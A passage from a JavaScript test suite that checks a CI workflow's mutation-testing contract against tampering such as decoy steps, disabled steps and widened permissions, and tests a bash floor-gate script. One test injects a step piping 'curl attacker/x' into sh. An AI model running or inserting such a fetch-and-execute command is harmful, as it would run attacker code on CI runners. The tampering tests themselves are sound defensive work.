      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                true\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 150',
  );
});

test("mutation contract rejects a hard exit spliced in right after the floor-compare loop", () => {
  // Still inside the same run: script, still outside any region a
  // start/end-anchored check would have captured: an `exit 1` dropped
  // immediately after the loop's own closing `done` line sits entirely
  // outside the old check's match, but not outside the step it runs in.
  assertMutationFailure(
    workflow.replace(
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"\n          exit 1',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects a same-length rewrite of the floor-compare loop's first body line", () => {
  // A test that only checks the warning line (line 17 of the loop body) or
  // otherwise compares a single index would never notice a rewrite
  // elsewhere in the same, unchanged-length array. `-n` flipped to `-z`
  // inverts the guard without changing the line's length.
  assertMutationFailure(
    workflow.replace(
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
      '          while IFS=\'|\' read -r group floor; do\n            [ -z "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 76 must be "            [ -n \\"${group}\\" ] || continue", found "            [ -z \\"${group}\\" ] || continue"',
  );
});

test("mutation contract rejects a same-length rewrite of the floor-compare loop's last body line", () => {
  // Same principle at the other end of the loop body: `fi` rewritten to
  // `fu` is a one-character, same-length change to the very last line of
  // the loop, as far from the warning line as this loop gets.
  assertMutationFailure(
    workflow.replace(
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fi\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
      '          while IFS=\'|\' read -r group floor; do\n            [ -n "${group}" ] || continue\n            [ "${group_present[${group}]:-no}" = "yes" ] || continue\n            killed_sum=0\n            lived_sum=0\n            while IFS=\'|\' read -r _ _ killed lived _ _; do\n              killed="${killed// /}"\n              lived="${lived// /}"\n              case "${killed}" in \'\'|*[!0-9]*) continue ;; esac\n              case "${lived}" in \'\'|*[!0-9]*) continue ;; esac\n              killed_sum=$((killed_sum + killed))\n              lived_sum=$((lived_sum + lived))\n            done < <(sed \'s/^|//;s/|$//\' rows/mutation-advisory-"${group}"-*/mutation-advisory-headline.txt)\n            total=$((killed_sum + lived_sum))\n            if [ "${total}" -gt 0 ]; then\n              efficacy="$(awk -v k="${killed_sum}" -v t="${total}" \'BEGIN { printf "%.2f", (k / t) * 100 }\')"\n              if awk -v e="${efficacy}" -v f="${floor}" \'BEGIN { exit !(e < f) }\'; then\n                echo "::warning::advisory group ${group} measured ${efficacy}% efficacy on the 6 extra mutators, below its floor of ${floor}%"\n              fi\n            fu\n          done <<<"${ADVISORY_GROUP_FLOORS}"',
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must match the pinned script exactly, or the wrapping, duplication, or splicing that a region check misses goes unnoticed; line 94 must be "            fi", found "            fu"',
  );
});

test("mutation contract rejects a same-named decoy step shadowing the real advisory summary step", () => {
  // `indexOf` finding the first `- name: Combine and publish the advisory
  // table` line would happily pick up a decoy placed earlier in the same
  // job, `if: false`, real name, and never notice the genuine step (with
  // whatever the decoy doesn't have) running unpinned right after it. The
  // step name has to be unique in the job before anything else about it
  // gets checked.
  assertMutationFailure(
    workflow.replace(
      "      - name: Combine and publish the advisory table\n        env:",
      '      - name: Combine and publish the advisory table\n        if: false\n        run: |\n          echo "decoy"\n\n      - name: Combine and publish the advisory table\n        env:',
    ),
    'the step named "Combine and publish the advisory table" must appear exactly once in the job, found 2 (a same-named decoy step can shadow the real one)',
  );
});

test("mutation contract rejects an advisory summary step that gains an if: false", () => {
  // A key added to the step, not a line rewritten inside its run: script:
  // the old run-scalar-only pin never looked at anything above `run: |`,
  // so `if: false` here would have shipped a step that never executes with
  // a body identical to the one this test already approved.
  assertMutationFailure(
    workflow.replace(
      "      - name: Combine and publish the advisory table\n        env:",
      "      - name: Combine and publish the advisory table\n        if: false\n        env:",
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects an advisory summary step that gains continue-on-error: true", () => {
  // Same blind spot, a different key: `continue-on-error: true` turns the
  // missing-group `exit 1` this job depends on into a no-op for the
  // workflow's own pass/fail result, without touching a single line the
  // old pin compared.
  assertMutationFailure(
    workflow.replace(
      "      - name: Combine and publish the advisory table\n        env:",
      "      - name: Combine and publish the advisory table\n        continue-on-error: true\n        env:",
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects an advisory summary step that gains a shell override", () => {
  // `shell: bash -n {0}` parses the script and exits without running a
  // single line of it -- the run: text stays byte-for-byte identical, so
  // only a check that looks at the step's OTHER keys catches it.
  assertMutationFailure(
    workflow.replace(
      "      - name: Combine and publish the advisory table\n        env:",
      "      - name: Combine and publish the advisory table\n        shell: bash -n {0}\n        env:",
    ),
    'the advisory summary job\'s "Combine and publish the advisory table" step must have exactly 129 lines, found 130',
  );
});

test("mutation contract rejects a step appended after a 2-space comment planted in the job's own step list", () => {
  // The old jobBlock ended at the FIRST 2-space comment as well as the next
  // job key, so a "  # note" line planted here truncated the slice right
  // there: an anonymous step spliced in after it would run in CI but never
  // appear in `summary` at all, invisible to stepBlockLines, the
  // exact-once name check, and every other assertion on this job's text.
  // jobBlock now ends only at the next job key, so this step count is what
  // actually notices the extra list item.
  assertMutationFailure(
    workflow.replace(
      "            exit 1\n          fi\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
      "            exit 1\n          fi\n\n  # note\n      - run: curl attacker/x | sh\n\n  # PW-6.1: the gate this workflow depends on silently stopped gating, and",
    ),
    "the advisory summary job must have exactly 3 steps, found 4",
  );
});

test("mutation contract rejects an advisory row that drops its timeout coefficient", () => {
  assertMutationFailure(
    workflow.replace("./internal/protocol|protocol|100|40", "./internal/protocol|protocol|100"),
    "protocol's advisory row must carry the timeout coefficient the advisory group requires",
  );
});

test("mutation contract rejects adapter-drydock's advisory row dropping its timeout coefficient", () => {
  assertMutationFailure(
    workflow.replace(
      "./internal/adapter/drydock|adapter-drydock|82.50|40",
      "./internal/adapter/drydock|adapter-drydock|82.50",
    ),
    "adapter-drydock's advisory row must carry the timeout coefficient the advisory group requires",
  );
});

test("mutation contract rejects an advisory job that stops passing its timeout coefficient", () => {
  assertMutationFailure(
    workflow.replace(`              "${coefficientArgsExpansion}" \\\n`, ""),
    "the advisory job must expand advisory_flags and default_mutator_flags on the unleash invocation",
  );
});

test("mutation contract rejects an advisory group missing fail-fast: false", () => {
  assertMutationFailure(
    workflow.replace(
      "    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - group: server",
      "    strategy:\n      matrix:\n        include:\n          - group: server",
    ),
    "the advisory matrix must set fail-fast: false so one group's failure does not hide the rest",
  );
});

test("mutation contract rejects an advisory job that reverts to a single job", () => {
  const source = workflow
    .replace(
      `    name: "Quality: Gremlins advisory mutators (${matrixGroup})"\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n`,
      '    name: "Quality: Gremlins advisory mutators"\n    runs-on: ubuntu-24.04\n    timeout-minutes: 120\n',
    )
    .replace(
      "\n    strategy:\n      fail-fast: false\n      matrix:\n        include:\n          - group: server\n            # PW-6.8: measured 95.77% efficacy on the 6 extra mutators in run\n            # 33901506579 (2026-09-04): killed 68, lived 3 across\n            # ./internal/server. Floor is floor(measured) - 2pp of slack.\n            floor: 93\n            packages: |\n              ./internal/server|server|77.88\n          - group: edge\n            # Measured 82.56% in run 33901506579 (2026-09-04): killed 71,\n            # lived 15 across ./internal/edge.\n            floor: 80\n            packages: |\n              ./internal/edge|edge|74.73\n          - group: generic\n            # Measured 83.33% in run 33901506579 (2026-09-04): killed 5,\n            # lived 1 across ./internal/generic.\n            floor: 81\n            packages: |\n              ./internal/generic|generic|85.00\n          - group: misc-a\n            # adapter-drydock hit the same cliff as pool and protocol: run\n            # 33848880338 generated 32 extra mutants and TIMED OUT 30 of\n            # them under the default timeout coefficient (coverage-gather\n            # time x 3), scoring 0 killed/0 lived with efficacy unmeasured.\n            # drydock's tests are slow relative to its coverage gather, so\n            # it gets the same |40 coefficient.\n            #\n            # Measured 94.02% in run 33901506579 (2026-09-04): killed 110,\n            # lived 7 summed across adapter, adapter-drydock, auth and audit.\n            floor: 92\n            packages: |\n              ./internal/adapter|adapter|84.68\n              ./internal/adapter/drydock|adapter-drydock|82.50|40\n              ./internal/auth|auth|88.58\n              ./internal/audit|audit|88.31\n          - group: misc-b\n            # Measured 94.52% in run 33901506579 (2026-09-04): killed 138,\n            # lived 8 summed across docker, mcp and metrics.\n            floor: 92\n            packages: |\n              ./internal/docker|docker|90.39\n              ./internal/mcp|mcp|79.49\n              ./internal/metrics|metrics|90.00\n          - group: misc-c\n            # Measured 92.86% in run 33901506579 (2026-09-04): killed 39,\n            # lived 3 summed across portwing, banner, config, log, pool and\n            # protocol.\n            floor: 90\n            packages: |\n              ./cmd/portwing|portwing|100\n              ./internal/banner|banner|76.92\n              ./internal/config|config|82.22\n              ./internal/log|log|\n              ./internal/pool|pool|50.00|40\n              ./internal/protocol|protocol|100|40\n",
      "",
    );
  assertMutationFailure(source, "the advisory job must be a matrix of package groups");
});

test("mutation contract rejects an advisory group that drops a package", () => {
  assertMutationFailure(
    workflow.replace("              ./internal/log|log|\n", ""),
    "every package in the gating matrix must appear in exactly one advisory group",
  );
});

test("mutation contract rejects an advisory group that duplicates a package", () => {
  assertMutationFailure(
    workflow.replace(
      "              ./internal/protocol|protocol|100|40\n",
      "              ./internal/protocol|protocol|100|40\n              ./internal/server|server|77.88\n",
    ),
    "./internal/server appears in both 'server' and 'misc-c'",
  );
});

test("mutation contract rejects an advisory job that never checks the flag names", () => {
  assertMutationFailure(
    workflow.replace('          help_text="$(gremlins unleash --help)"\n', ""),
    "the advisory job must check the flag names against the binary",
  );
});

test("mutation contract rejects an advisory job that can pass having measured nothing", () => {
  assertMutationFailure(
    workflow.replace(
      `          if [ "${advisoryMutants}" -eq 0 ]; then`,
      "          if false; then",
    ),
    "the advisory job must fail when the advisory mutators produce nothing",
  );
});

test("mutation contract rejects an advisory job that reports a report-less success as unavailable", () => {
  const zeroMutantsBlock =
    '            if [ ! -f "' +
    advisoryReportVar +
    '" ]; then\n' +
    '              echo "advisory: ' +
    advisoryNameVar +
    ' produced no mutants of any advisory type; recording zero-mutants"\n' +
    '              headline_rows+=("| \\`' +
    advisoryPackageVar +
    '\\` | 0 | 0 | 0 | 0 | n/a |")\n' +
    '              mutator_rows+=("| \\`' +
    advisoryPackageVar +
    '\\` | 0 | 0 | 0 | 0 | 0 | 0 |")\n' +
    "              continue\n" +
    "            fi\n\n";
  assertMutationFailure(
    workflow.replace(zeroMutantsBlock, ""),
    "the advisory job must treat a report-less success as zero mutants, not unavailable",
  );
});

test("mutation contract rejects an advisory job that folds not_covered into the unmeasured guard", () => {
  const foldedGuard = `if [ "${advisoryMutantCountVar}" -gt 0 ] && [ "${killedPlusLivedPlusNotCovered}" -eq 0 ]; then`;
  assertMutationFailure(
    workflow.replace(advisoryUnmeasuredGuard, foldedGuard),
    "the advisory job's unmeasured guard must sum only killed and lived, not not_covered",
  );
});

// PW-6.8's split, applied a second time: the summary job that assembles the
// matrix legs' rows must stay read-only and must never re-run what the legs
// already ran, or the point of splitting the job is undone by the job that
// puts it back together.
test("mutation contract rejects a missing advisory summary job", () => {
  assertMutationFailure(
    workflow.replace("  mutation-advisory-summary:\n", "  mutation-advisory-summary-disabled:\n"),
    "the advisory summary job is missing",
  );
});

test("mutation contract rejects an advisory summary job that stops needing the matrix", () => {
  assertMutationFailure(
    workflow.replace("    needs: mutation-advisory\n", "    needs: []\n"),
    "the advisory summary job must need mutation-advisory",
  );
});

test("mutation contract rejects an advisory summary job that only runs on success", () => {
  const source = workflow.replace(
    "    needs: mutation-advisory\n    if: always()\n",
    "    needs: mutation-advisory\n",
  );
  assertMutationFailure(source, "the advisory summary job must run even if a leg failed");
});

test("mutation contract rejects an advisory summary job with a write scope", () => {
  const source = workflow.replace(
    '  mutation-advisory-summary:\n    name: "Quality: Gremlins advisory mutators summary"\n    needs: mutation-advisory\n    if: always()\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n\n    permissions:\n      contents: read\n',
    '  mutation-advisory-summary:\n    name: "Quality: Gremlins advisory mutators summary"\n    needs: mutation-advisory\n    if: always()\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n\n    permissions:\n      contents: write\n',
  );
  assertMutationFailure(
    source,
    "the advisory summary job's permissions must be exactly contents: read",
  );
});

test("mutation contract rejects an advisory summary job that runs Go tooling", () => {
  const source = workflow.replace(
    "      - name: Download the advisory rows",
    "      - name: Setup Go\n        uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e  # v7.0.0\n        with:\n          go-version-file: go.mod\n\n      - name: Download the advisory rows",
  );
  assertMutationFailure(
    source,
    "the advisory summary job must not run 'actions/setup-go'; it only assembles rows the legs already computed",
  );
});

test("mutation contract rejects an advisory summary job that stops downloading every leg", () => {
  // Anchored on the trailing "path: rows" rather than the bare pattern
  // line: PW-2.5's history job downloads the same artifact pattern into
  // "path: advisory", and a bare-pattern replace would silently hit that
  // occurrence first since it now comes earlier in the file.
  assertMutationFailure(
    workflow.replace(
      `          pattern: mutation-advisory-*-${githubRunId}\n          path: rows\n`,
      `          pattern: mutation-advisory-server-${githubRunId}\n          path: rows\n`,
    ),
    "the advisory summary job must download every leg's rows artifact",
  );
});

// `cat rows/*/... || true` reads a missing group's rows file the same way it
// reads an empty one: silently. A leg killed before it could upload (the
// runner's CPU-shutdown signal PW-6.8 documents on the matrix above) must
// turn this job red, not leave the table quietly short one group.
test("mutation contract rejects an advisory summary job that drops its group inventory", () => {
  assertMutationFailure(
    workflow.replace(
      "          ADVISORY_GROUP_PACKAGES: |\n",
      "          ADVISORY_GROUP_PACKAGES_RENAMED: |\n",
    ),
    "the advisory summary job must declare ADVISORY_GROUP_PACKAGES",
  );
});

test("mutation contract rejects an advisory summary job whose group inventory drifts from the matrix", () => {
  // Anchored on the preceding "ADVISORY_GROUP_PACKAGES: |" key: the
  // "server|./internal/server" line by itself is no longer unique in the
  // file once PW-2.5's history job carries the same pair in its own
  // MUTATION_PACKAGES block.
  assertMutationFailure(
    workflow.replace(
      "          ADVISORY_GROUP_PACKAGES: |\n            server|./internal/server\n",
      "          ADVISORY_GROUP_PACKAGES: |\n            server|./internal/serverx\n",
    ),
    "the advisory summary job's ADVISORY_GROUP_PACKAGES must match the advisory matrix's own groups and packages exactly",
  );
});

test("mutation contract rejects an advisory summary job that cannot notice a missing group", () => {
  const missingGroupsBlock =
    '          if [ "' +
    missingGroupsCount +
    '" -gt 0 ]; then\n            echo "::error::advisory legs produced no artifact for group(s): ' +
    missingGroupsList +
    '" >&2\n            exit 1\n          fi\n';
  assertMutationFailure(
    workflow.replace(missingGroupsBlock, ""),
    "the advisory summary job must fail when a group's leg never uploaded",
  );
});

test("mutation contract rejects a repo-root Gremlins config", () => {
  assertNoRootGremlinsConfig((name) => fs.existsSync(path.join(ROOT, name)));
  assert.throws(
    () => assertNoRootGremlinsConfig((name) => name === ".gremlins.yaml"),
    /would change every gating floor's mutator set/u,
  );
});

// PW-5.5's split, applied to the ratchet job: a proposal-only job that grows
// a real dependency on Go, Gremlins or git's write path has stopped being
// read-only in fact, whatever its `permissions:` block still claims.
test("mutation contract rejects a missing ratchet job", () => {
  assertMutationFailure(
    workflow.replace("  ratchet:\n", "  ratchet-disabled:\n"),
    "the mutation ratchet job is missing",
  );
});

test("mutation contract rejects a ratchet job that stops needing history", () => {
  assertMutationFailure(
    workflow.replace("    needs: [gremlins, history]\n", "    needs: [gremlins]\n"),
    "the ratchet job must need both gremlins and history",
  );
});

test("mutation contract rejects a ratchet job with a write scope", () => {
  const source = workflow.replace(
    "  ratchet:\n    name: \"Quality: Mutation floor ratchet proposal\"\n    needs: [gremlins, history]\n    if: always() && (github.event_name == 'schedule' || github.event_name == 'workflow_dispatch')\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n\n    permissions:\n      contents: read\n",
    "  ratchet:\n    name: \"Quality: Mutation floor ratchet proposal\"\n    needs: [gremlins, history]\n    if: always() && (github.event_name == 'schedule' || github.event_name == 'workflow_dispatch')\n    runs-on: ubuntu-24.04\n    timeout-minutes: 15\n\n    permissions:\n      contents: write\n",
  );
  assertMutationFailure(source, "the ratchet job's permissions must be exactly contents: read");
});

test("mutation contract rejects a ratchet job that runs Gremlins itself", () => {
  const source = workflow.replace(
    "      - name: Propose floor ratchets\n        run: |\n          set -euo pipefail\n",
    '      - name: Propose floor ratchets\n        run: |\n          set -euo pipefail\n          gremlins unleash --tags="" ./internal/edge\n',
  );
  assertMutationFailure(source, "the ratchet job must not run 'gremlins unleash'; it only reads");
});

test("mutation contract rejects a ratchet job that hardcodes a ratchet parameter", () => {
  const source = workflow.replace(
    "          set -euo pipefail\n          ./scripts/ci/mutation-ratchet.sh records quality-history/mutation.jsonl mutation-ratchet-proposal.json\n",
    '          set -euo pipefail\n          min_gain="2.0"\n          ./scripts/ci/mutation-ratchet.sh records quality-history/mutation.jsonl mutation-ratchet-proposal.json\n',
  );
  assertMutationFailure(
    source,
    "the ratchet job's run steps must not hardcode a floating-point literal; ratchet parameters live in scripts/ci/mutation-ratchet.sh",
  );
});

// The other half of PW-6.1. The workflow tests above prove the gate is wired
// in; these prove it actually rejects a below-floor measurement, which is the
// thing Gremlins' own threshold flags silently stopped doing.
function runGate(report, efficacyFloor, mcoverFloor) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mutation-gate-"));
  try {
    const reportPath = path.join(dir, "report.json");
    if (report !== null) fs.writeFileSync(reportPath, report);
    return spawnSync("bash", [GATE, reportPath, String(efficacyFloor), String(mcoverFloor)], {
      encoding: "utf8",
    });
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

// auth's real numbers. Its floors were copied from Gremlins' two-decimal
// report, so a gate comparing full JSON precision would reject the very run
// the floors came from.
const authReport = JSON.stringify({
  test_efficacy: 79.16666666666666,
  mutations_coverage: 97.95918367346938,
  mutants_killed: 76,
  mutants_lived: 20,
  mutants_not_covered: 2,
});

test("mutation gate passes a package sitting exactly on its floor", () => {
  const result = runGate(authReport, 79.17, 97.96);
  assert.equal(result.status, 0, result.stderr);
});

test("mutation gate fails a package below its efficacy floor", () => {
  const result = runGate(authReport, 79.18, 97.96);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /test efficacy 79\.17% is below its floor of 79\.18%/u);
});

test("mutation gate fails a package below its mutator coverage floor", () => {
  const result = runGate(authReport, 79.17, 97.97);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /mutator coverage 97\.96% is below its floor of 97\.97%/u);
});

test("mutation gate fails when every mutant timed out", () => {
  // internal/protocol's shape before PW-6.2: five TIMED OUT mutants, which
  // Gremlins scores 0.00/0.00 as though it had measured something.
  const report = JSON.stringify({
    test_efficacy: 0,
    mutations_coverage: 0,
    mutants_killed: 0,
    mutants_lived: 0,
    mutants_not_covered: 0,
  });
  const result = runGate(report, 100, 100);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /no mutant returned a KILLED or LIVED verdict/u);
});

test("mutation gate fails when Gremlins wrote no report", () => {
  const result = runGate(null, 0, 0);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /Gremlins wrote no report/u);
});

test("mutation gate fails on an unreadable report rather than passing it", () => {
  const result = runGate("not json", 0, 0);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /not a readable Gremlins JSON report/u);
});

test("mutation gate rejects a floor that is not a number", () => {
  const result = runGate(authReport, "notafloor", 0);
  assert.equal(result.status, 2);
  assert.match(result.stderr, /is not a plain decimal percentage/u);
});
